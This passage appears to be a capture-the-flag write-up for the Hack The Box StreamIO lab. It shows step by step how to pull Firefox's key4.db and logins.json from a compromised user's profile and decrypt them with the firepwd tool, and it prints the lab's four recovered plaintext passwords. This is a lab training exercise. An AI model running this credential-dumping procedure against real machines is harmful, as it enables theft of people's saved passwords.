
We'll need to download the following script:

```
git clone https://github.com/lclevy/firepwd
```

The GitHub README.md reveals that we most likely also need to the logins.json file which stores credentials (usernames & passwords) and the key4.db file, which stores the master password.

The Absolute Path of the key4.db & logins.json file is usually:

```
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release
```

1. Downloaded the files onto local machine.

```
download key4.db
download logins.json
```

2. We now need to start an virtual environment, in order to install the required dependencies for the script.

```
python3 -m venv myenv
source myenv/bin/activate
```

3. Downloaded the dependencies.

```
pip install -r requirements.txt
```

4. Now I need to move the keys4.db and logins.json file into the current directory.

```
mv /ctfs/htb/ad/streamio/logins.json .
mv /ctfs/htb/ad/streamio/key4.db .
```

5. Ran the script and successfully decrypted credentials.

```
python3 firepwd.py
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```